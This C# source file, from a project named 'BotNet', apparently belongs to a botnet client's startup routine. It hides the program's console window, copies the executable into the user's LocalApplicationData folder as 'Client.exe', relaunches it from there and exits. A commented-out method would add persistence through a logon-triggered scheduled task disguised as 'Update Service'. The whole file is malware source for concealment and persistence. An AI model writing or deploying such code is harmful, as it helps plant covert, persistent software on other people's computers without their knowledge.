using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Win32.TaskScheduler;

namespace BotNet
{

    class StartupHandler
    {
        public readonly string finalDestination;
        public readonly string originalLocation;
        public readonly string fileName;

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();


        [DllImport("user32.dll")]
        public static extern Boolean ShowWindow(IntPtr hWnd, int nCmdShow);

        public StartupHandler()
        {
            this.fileName = "Client.exe";
            this.originalLocation = Environment.CurrentDirectory + @"\"+ AppDomain.CurrentDomain.FriendlyName;
            this.finalDestination = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\" + this.fileName;

        }
        /*
        public void addToStartup()
        {
            using (TaskService s = new TaskService())
            {
                TaskDefinition d = s.NewTask();

                d.RegistrationInfo.Description = "";
                 
                d.Triggers.Add(new LogonTrigger { UserId = WindowsIdentity.GetCurrent().Name });

                d.Actions.Add(new ExecAction(this.finalDestination, "", this.finalDestination.Remove(this.finalDestination.Length-this.fileName.Length, this.fileName.Length)));

                d.Principal.RunLevel = TaskRunLevel.LUA;

                s.RootFolder.RegisterTaskDefinition("Update Service", d);
            }
        }
        */
        public bool fileExists()
        {
            return this.finalDestination == this.originalLocation;
        }

        public void hideWindow()
        {
            ShowWindow(GetConsoleWindow(), 0);
        }

        public void moveRunningLocation()
        {
            if (!File.Exists(this.finalDestination))
            {
                File.Move(this.originalLocation, this.finalDestination);
                Process.Start(this.finalDestination);
                Environment.Exit(0);
            }
            else
            {
                Process.Start(this.finalDestination);
                Environment.Exit(0);
            }
        }
    }
}
